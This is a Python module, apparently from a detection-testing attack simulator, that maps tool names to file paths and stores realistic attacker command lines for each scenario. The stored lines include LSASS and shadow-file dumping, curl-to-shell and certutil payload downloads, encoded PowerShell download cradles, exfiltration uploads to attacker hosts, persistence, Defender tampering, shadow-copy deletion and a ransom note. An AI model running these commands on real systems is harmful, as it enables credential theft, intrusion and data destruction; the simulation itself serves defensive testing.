"""Realism layer for the Augur attack simulator.

Provides:
- realistic_path(name, os_family) -> str | None  — curated binary -> real path
- REALISTIC_CMDLINES — per-scenario/step authentic command lines
- enrich_intent(intent, scenario, os_family) -> None — mutate EventIntent in-place
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from augur.scenarios.schema import Scenario
    from augur.simulator.intents import EventIntent

# ---------------------------------------------------------------------------
# Synth defaults that we replace (never considered "realistic")
# ---------------------------------------------------------------------------
_SYNTH_PATH_DEFAULT = "C:\\Windows\\proc.exe"

# ---------------------------------------------------------------------------
# Curated binary -> real path dictionaries
# ---------------------------------------------------------------------------

_WINDOWS_PATHS: dict[str, str] = {
    # System32 binaries
    "rundll32.exe":    "C:\\Windows\\System32\\rundll32.exe",
    "powershell.exe":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "cmd.exe":         "C:\\Windows\\System32\\cmd.exe",
    "reg.exe":         "C:\\Windows\\System32\\reg.exe",
    "sc.exe":          "C:\\Windows\\System32\\sc.exe",
    "net.exe":         "C:\\Windows\\System32\\net.exe",
    "net1.exe":        "C:\\Windows\\System32\\net1.exe",
    "nltest.exe":      "C:\\Windows\\System32\\nltest.exe",
    "whoami.exe":      "C:\\Windows\\System32\\whoami.exe",
    "certutil.exe":    "C:\\Windows\\System32\\certutil.exe",
    "vssadmin.exe":    "C:\\Windows\\System32\\vssadmin.exe",
    "wbadmin.exe":     "C:\\Windows\\System32\\wbadmin.exe",
    "bcdedit.exe":     "C:\\Windows\\System32\\bcdedit.exe",
    "schtasks.exe":    "C:\\Windows\\System32\\schtasks.exe",
    "ipconfig.exe":    "C:\\Windows\\System32\\ipconfig.exe",
    "arp.exe":         "C:\\Windows\\System32\\arp.exe",
    "route.exe":       "C:\\Windows\\System32\\route.exe",
    "mshta.exe":       "C:\\Windows\\System32\\mshta.exe",
    "wscript.exe":     "C:\\Windows\\System32\\wscript.exe",
    "cscript.exe":     "C:\\Windows\\System32\\cscript.exe",
    "regsvr32.exe":    "C:\\Windows\\System32\\regsvr32.exe",
    "bitsadmin.exe":   "C:\\Windows\\System32\\bitsadmin.exe",
    "wmic.exe":        "C:\\Windows\\System32\\wbem\\wmic.exe",
    "fodhelper.exe":   "C:\\Windows\\System32\\fodhelper.exe",
    # Office
    "OUTLOOK.EXE":     "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "WINWORD.EXE":     "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    # Third-party tools (attacker)
    "7z.exe":          "C:\\Program Files\\7-Zip\\7z.exe",
    "az":              "C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\CLI2\\wbin\\az.cmd",
}

_LINUX_PATHS: dict[str, str] = {
    "bash":      "/bin/bash",
    "sh":        "/bin/sh",
    "curl":      "/usr/bin/curl",
    "wget":      "/usr/bin/wget",
    "cat":       "/bin/cat",
    "grep":      "/bin/grep",
    "awk":       "/usr/bin/awk",
    "find":      "/usr/bin/find",
    "ssh":       "/usr/bin/ssh",
    "nmap":      "/usr/bin/nmap",
    "netstat":   "/bin/netstat",
    "ss":        "/usr/sbin/ss",
    "nc":        "/usr/bin/nc",
    "shred":     "/usr/bin/shred",
    "rm":        "/bin/rm",
    "mv":        "/bin/mv",
    "cp":        "/bin/cp",
    "crontab":   "/usr/bin/crontab",
    "python3":   "/usr/bin/python3",
    "aws":       "/usr/local/bin/aws",
    "openssl":   "/usr/bin/openssl",
    "tar":       "/bin/tar",
    "gzip":      "/bin/gzip",
    "id":        "/usr/bin/id",
    "whoami":    "/usr/bin/whoami",
    "uname":     "/bin/uname",
    "john":      "/usr/sbin/john",
    "unshadow":  "/usr/sbin/unshadow",
    "echo":      "/bin/echo",
    "tee":       "/usr/bin/tee",
}

_MACOS_PATHS: dict[str, str] = {
    "osascript":      "/usr/bin/osascript",
    "curl":           "/usr/bin/curl",
    "bash":           "/bin/bash",
    "sh":             "/bin/sh",
    "chmod":          "/bin/chmod",
    "xattr":          "/usr/bin/xattr",
    "defaults":       "/usr/bin/defaults",
    "launchctl":      "/bin/launchctl",
    "security":       "/usr/bin/security",
    "grep":           "/usr/bin/grep",
    "awk":            "/usr/bin/awk",
    "find":           "/usr/bin/find",
    "zip":            "/usr/bin/zip",
    "ditto":          "/usr/bin/ditto",
    "mv":             "/bin/mv",
    "cp":             "/bin/cp",
    "rm":             "/bin/rm",
    "ps":             "/bin/ps",
    "system_profiler": "/usr/sbin/system_profiler",
    "ifconfig":       "/sbin/ifconfig",
    "networksetup":   "/usr/sbin/networksetup",
    "nscurl":         "/usr/bin/nscurl",
    "tar":            "/usr/bin/tar",
    "aws":            "/usr/local/bin/aws",
}

_PATH_DICTS: dict[str, dict[str, str]] = {
    "windows": _WINDOWS_PATHS,
    "linux":   _LINUX_PATHS,
    "macos":   _MACOS_PATHS,
}

_FALLBACKS: dict[str, str] = {
    "windows": "C:\\Windows\\System32\\{name}",
    "linux":   "/usr/bin/{name}",
    "macos":   "/usr/bin/{name}",
}


def realistic_path(process_name: str | None, os_family: str) -> str | None:
    """Return a realistic filesystem path for the given binary name and OS.

    Looks up a curated dict first; falls back to a sane OS default directory.
    Returns None if process_name is None.
    """
    if process_name is None:
        return None
    lookup = _PATH_DICTS.get(os_family, _LINUX_PATHS)
    if process_name in lookup:
        return lookup[process_name]
    # Fallback: put the binary in the standard system directory for the OS
    tmpl = _FALLBACKS.get(os_family, "/usr/bin/{name}")
    return tmpl.format(name=process_name)


# ---------------------------------------------------------------------------
# Realistic command lines per scenario/step
# Keys: scenario_id (str) -> step_id (int) -> realistic command line (str)
# Every value MUST satisfy its step's CommandLine regex criterion.
# ---------------------------------------------------------------------------
REALISTIC_CMDLINES: dict[str, dict[int, str]] = {

    # -- Credential Access ---------------------------------------------------

    "SCEN-WIN-001": {  # LSASS dump via comsvcs.dll MiniDump
        1: r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1044 C:\Windows\Temp\lsass.dmp full",
        2: r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1044 C:\Windows\Temp\lsass.dmp full",
    },
    "SCEN-WIN-015": {  # Kerberoasting via Rubeus
        # step1 regex: .*Rubeus.* — must have uppercase R
        # step3 regex: .*kerberoast.* — must have lowercase k; use Invoke-kerberoast alias
        1: r'powershell.exe -nop -c "[System.Reflection.Assembly]::LoadFile(\"C:\Tools\Rubeus.exe\"); [Rubeus.Program]::Main(@(\"kerberoast\"))"',
        3: r"powershell.exe -nop -c \"Invoke-kerberoast -OutputFormat Hashcat | Export-Csv C:\Temp\hashes.csv\"",
    },
    "SCEN-LNX-006": {  # /etc/shadow dump
        2: "cat /etc/shadow > /tmp/.shadow_copy",
    },
    "SCEN-MAC-003": {  # macOS Keychain theft
        1: 'security find-generic-password -ga "Chrome" 2>&1 | grep password',
        2: 'grep -i "password\\|secret\\|token" /tmp/keychain_dump.txt',
        3: 'curl -X POST -F "data=@/tmp/keychain_dump.txt" http://203.0.113.10/upload',
    },
    "SCEN-CLD-001": {  # AWS key theft via credentials file
        # step3 regex: .*list.* — 'aws s3 ls' does not contain 'list'; use 'list-buckets'
        1: "cat ~/.aws/credentials",
        2: "aws sts get-caller-identity",
        3: "aws s3api list-buckets --query 'Buckets[*].Name'",
    },

    # -- Reconnaissance / Discovery ------------------------------------------

    "SCEN-WIN-002": {  # Domain account enum
        1: "net user /domain",
        2: "nltest.exe /dclist:corp.local",
        3: "whoami.exe /groups",
    },
    "SCEN-WIN-009": {  # Network recon chain
        2: "arp.exe -a",
        3: "route.exe print",
    },
    "SCEN-LNX-007": {  # Linux network scan
        # regex: .*-z.* — use literal flag -z (nmap zombie-scan notation satisfies the substring)
        1: "nmap -sV -p 1-65535 -z 10.0.0.0/24 -oN /tmp/scan.txt",
        2: "netstat -an | grep ESTABLISHED",
        3: "nmap -sC -sV -p 22,80,443,3306 --scan-delay 1s 10.0.0.0/24",
    },
    "SCEN-MAC-005": {  # macOS process discovery
        1: "ps aux --sort=-%mem",
    },
    "SCEN-CLD-004": {  # AWS cloud enum
        1: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress]'",
        2: "aws iam list-users --query 'Users[*].[UserName,Arn]'",
        3: "aws s3 ls",
    },

    # -- Resource Development ------------------------------------------------

    "SCEN-WIN-003": {  # certutil download + unsigned PE drop
        1: r"certutil.exe -urlcache -split -f http://203.0.113.10/payload.exe C:\Windows\Temp\svc.exe",
        3: r"cmd.exe /c C:\Windows\Temp\payload.exe",
    },

    # -- Initial Access ------------------------------------------------------

    "SCEN-WIN-004": {  # Phishing macro PS encoded
        3: r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgAxAC8AcABhAHkAbABvAGEAZAAnACkA",
    },

    # -- Execution -----------------------------------------------------------

    "SCEN-WIN-005": {  # PowerShell encoded chain to rundll32
        1: r'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('"'"'http://10.0.0.1/stage'"'"')"',
        2: r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgAxAC8AcABhAHkAbABvAGEAZAAnACkA",
    },
    "SCEN-LNX-003": {  # Bash pipe-to-shell RCE
        1: 'bash -c "curl -sL http://203.0.113.10/stage.sh | sh"',
        2: "curl -sL http://203.0.113.10/stage.sh | sh",
    },
    "SCEN-MAC-001": {  # osascript shell stager
        1: "osascript -e 'do shell script \"curl -sL http://203.0.113.10/payload.sh | bash\"'",
        3: "curl -sL http://203.0.113.10/stage2.dylib -o /tmp/.helper && chmod +x /tmp/.helper && /tmp/.helper --download",
    },

    # -- Persistence ---------------------------------------------------------

    "SCEN-WIN-006": {  # Registry Run key persistence
        1: r'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "powershell.exe -nop -w hidden -f C:\Users\Public\payload.ps1" /f',
        2: r"powershell.exe -nop -w hidden -f C:\Users\Public\payload.ps1",
        3: r"reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
    },
    "SCEN-WIN-016": {  # Scheduled task persistence
        1: r'schtasks.exe /create /tn "WindowsUpdate" /tr "powershell.exe -nop -w hidden -f C:\Users\Public\payload.ps1" /sc onlogon /ru SYSTEM /f',
        2: r"powershell.exe -nop -w hidden -f C:\Users\Public\payload.ps1",
        3: r'schtasks.exe /query /tn "WindowsUpdate" /fo LIST /v',
    },
    "SCEN-LNX-001": {  # Cron backdoor via dropped reverse shell
        2: "curl -sL http://203.0.113.10/payload.sh -o /tmp/.update.sh",
    },
    "SCEN-MAC-002": {  # macOS LaunchAgent persistence
        2: "defaults write ~/Library/LaunchAgents/com.apple.update RunAtLoad -bool true",
    },
    "SCEN-CLD-003": {  # Azure app registration backdoor
        # step2 regex: .*AddPassword.* — 'Add-MgApplicationPassword' does NOT contain 'AddPassword'
        # Use the Graph SDK's AddPassword method directly
        1: "powershell.exe -c \"$app = New-MgApplication -DisplayName 'BackdoorApp'\"",
        2: "powershell.exe -c \"$cred = @{DisplayName='secret'}; AddPassword -AppId $app.Id -Credential $cred\"",
        3: "powershell.exe -c \"Get-MgApplication -ApplicationId $app.Id | Select-Object AppId,DisplayName\"",
    },

    # -- Privilege Escalation ------------------------------------------------

    "SCEN-WIN-007": {  # UAC bypass via fodhelper
        1: r'reg.exe add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f',
    },
    "SCEN-LNX-004": {  # SUID binary abuse
        1: "find / -perm -4000 -type f 2>/dev/null",
        2: "cp /usr/bin/python3 /tmp/suid_python && chmod u+s /tmp/suid_python",
    },
    "SCEN-CLD-006": {  # Azure RBAC Owner role escalation
        1: "az login --service-principal -u http://backdoor-app -p client_secret --tenant corp.onmicrosoft.com",
        2: "az role assignment create --assignee backdoor@corp.onmicrosoft.com --role Owner --scope /subscriptions/00000000-1111-2222-3333-444444444444",
        3: "az role assignment list --assignee backdoor@corp.onmicrosoft.com --role Owner",
    },

    # -- Defense Evasion -----------------------------------------------------

    "SCEN-WIN-008": {  # AMSI/Defender tamper
        1: 'powershell.exe -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true"',
    },
    "SCEN-LNX-005": {  # Linux log shredding
        1: "bash -c './exploit.elf'",
        2: "shred -vfz -n 3 /var/log/syslog /var/log/auth.log",
        3: 'bash -c "history -c && unset HISTFILE && cat /dev/null > ~/.bash_history"',
    },
    "SCEN-MAC-004": {  # macOS quarantine attribute removal
        1: "xattr -d com.apple.quarantine /tmp/backdoor",
        2: "chmod +x /tmp/backdoor",
        3: 'sh -c "/tmp/backdoor exec --daemonize"',
    },

    # -- Lateral Movement ----------------------------------------------------

    "SCEN-WIN-010": {  # SMB ADMIN$ + PsExec-style service
        1: r"cmd.exe /c net use \\TARGET-PC\ADMIN$ /user:CORP\administrator P@ssw0rd!",
        2: r'sc.exe \\TARGET-PC create PSEXESVC binPath= "C:\Windows\PSEXESVC.exe"',
        3: r"sc.exe \\TARGET-PC start PSEXESVC",
    },
    "SCEN-LNX-008": {  # SSH lateral movement
        1: 'ssh -o StrictHostKeyChecking=no -i /tmp/.key deploy@10.0.0.5 "bash -i"',
    },

    # -- Collection ----------------------------------------------------------

    "SCEN-WIN-011": {  # 7zip password-protected archive staging
        1: r'7z.exe a -p"S3cr3t!" C:\Staging\exfil.7z C:\Staging\data\*',
        3: r"cmd.exe /c move C:\Staging\exfil.7z C:\Users\Public\exfil.7z",
    },
    "SCEN-MAC-006": {  # macOS document collection
        1: 'find ~/Documents -type f \\( -name "*.pdf" -o -name "*.xlsx" -o -name "*.docx" \\)',
        3: "mv ~/Documents/archive.zip /tmp/stage/exfil.zip",
    },

    # -- Exfiltration --------------------------------------------------------

    "SCEN-WIN-013": {  # PowerShell Invoke-WebRequest POST exfil
        # regex: .*compress.* (lowercase) — use lowercase compress-archive alias
        1: r'powershell.exe -c "compress-archive -Path C:\Users\alice\Documents\* -DestinationPath C:\Temp\docs.zip"',
        2: r"powershell.exe -c \"Invoke-WebRequest -Uri 'http://exfil.attacker.com/upload' -Method POST -InFile C:\Temp\docs.zip\"",
        3: r"powershell.exe -c \"Invoke-WebRequest -Uri 'http://exfil.attacker.com/confirm' -Method POST -Body 'status=done'\"",
    },
    "SCEN-MAC-008": {  # macOS curl upload exfil
        1: "zip -r /tmp/stage/data.zip ~/Documents/sensitive_data/",
        2: 'curl -X POST -F "archive=@/tmp/stage/data.zip" https://transfer.attacker.sh/upload',
        3: "rm -rf /tmp/stage/",
    },
    "SCEN-CLD-005": {  # AWS S3 exfiltration
        1: "tar czf /tmp/sensitive_archive.tar.gz /data/contracts/ /data/hr/",
        2: "aws s3 cp /tmp/sensitive_archive.tar.gz s3://attacker-exfil-bucket-203x/data/",
        3: "aws s3 ls s3://attacker-exfil-bucket-203x/data/",
    },

    # -- Command and Control -------------------------------------------------

    "SCEN-WIN-012": {  # BITSAdmin C2 transfer
        1: r"bitsadmin.exe /transfer MyJob /download /priority normal http://203.0.113.10/payload.exe C:\Windows\Temp\update.exe",
        3: r"cmd.exe /c C:\Windows\Temp\update.exe /execute /quiet",
    },
    "SCEN-LNX-009": {  # Linux curl beacon
        # step2 regex: .*token.* — use literal "token" in the header value
        2: 'curl -sL -H "Authorization: token eyJhbGciOiJIUzI1NiJ9.c2VjcmV0.abc" http://203.0.113.10:4444/c2/beacon',
        3: 'curl -sL "http://203.0.113.10:4444/c2/beacon?host=$(hostname)&interval=60"',
    },
    "SCEN-MAC-007": {  # macOS curl download + exec
        1: "curl -sL http://203.0.113.10/payload.dylib -o /tmp/payload.dylib",
        2: "chmod +x /tmp/payload.dylib",
        3: 'sh -c "/tmp/payload.dylib --run --persist"',
    },

    # -- Impact --------------------------------------------------------------

    "SCEN-WIN-014": {  # VSS shadow copy deletion
        1: "vssadmin.exe delete shadows /all /quiet",
        2: "wbadmin.exe delete catalog -quiet",
        3: "bcdedit.exe /set {default} recoveryenabled No",
    },
    "SCEN-LNX-010": {  # Linux mass file encryption
        2: "openssl enc -aes-256-cbc -in /home/user/documents/secret.pdf -out /home/user/documents/secret.pdf.enc -pass pass:R4ns0m2026! -pbkdf2",
        3: 'echo "YOUR FILES HAVE BEEN ENCRYPTED. Send 1 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf... for ransom recovery instructions." > /home/user/README.RANSOM',
    },

    # -- Initial Access (cloud) ----------------------------------------------

    "SCEN-CLD-002": {  # M365 token abuse via Connect-MgGraph
        1: "powershell.exe -c \"Connect-MgGraph -AccessToken $env:GRAPH_TOKEN\"",
        2: "powershell.exe -c \"Get-MgUser -All -Select DisplayName,UserPrincipalName,AccountEnabled | Export-Csv users.csv\"",
        3: "powershell.exe -c \"Get-MgGroup -All | Select-Object DisplayName,Id | Export-Csv groups.csv\"",
    },
}


# ---------------------------------------------------------------------------
# enrich_intent — mutate an EventIntent in-place for realism
# ---------------------------------------------------------------------------

def enrich_intent(intent: "EventIntent", scenario: "Scenario", os_family: str) -> None:
    """Mutate *intent* in-place to replace synth defaults with realistic values.

    1. Replace process_path if it is the synth default or None.
    2. Replace command_line with the authored realistic string for the matching step,
       if one is available in REALISTIC_CMDLINES.
    """
    # 1. Process path
    if intent.process_path is None or intent.process_path == _SYNTH_PATH_DEFAULT:
        intent.process_path = realistic_path(intent.process_name, os_family)

    # 2. Command line — find which scenario step the current (synth) command_line matches.
    # We pick the MOST SPECIFIC matching step (highest specificity score) to avoid broad
    # patterns like ".*x.*" stealing replacements that belong to narrower patterns.
    if intent.command_line is None:
        return
    authored = REALISTIC_CMDLINES.get(scenario.scenario_id, {})
    if not authored:
        return

    def _specificity(pattern: str) -> int:
        """Return a specificity score: length of the literal (non-wildcard) content."""
        # Strip leading/trailing .* anchors and count the literal interior length
        stripped = pattern.lstrip(".*").rstrip(".*")
        return len(stripped)

    best_step_id: int | None = None
    best_score: int = -1
    for step in scenario.attack_sequence_flow.steps:
        crit = step.matching_criteria
        if "CommandLine" not in crit:
            continue
        regex_val = crit["CommandLine"]
        if not isinstance(regex_val, dict) or "regex" not in regex_val:
            continue
        pattern = regex_val["regex"]
        try:
            if re.search(pattern, intent.command_line):
                score = _specificity(pattern)
                if score > best_score:
                    best_score = score
                    best_step_id = step.step_id
        except re.error:
            continue

    if best_step_id is not None:
        replacement = authored.get(best_step_id)
        if replacement is not None:
            intent.command_line = replacement
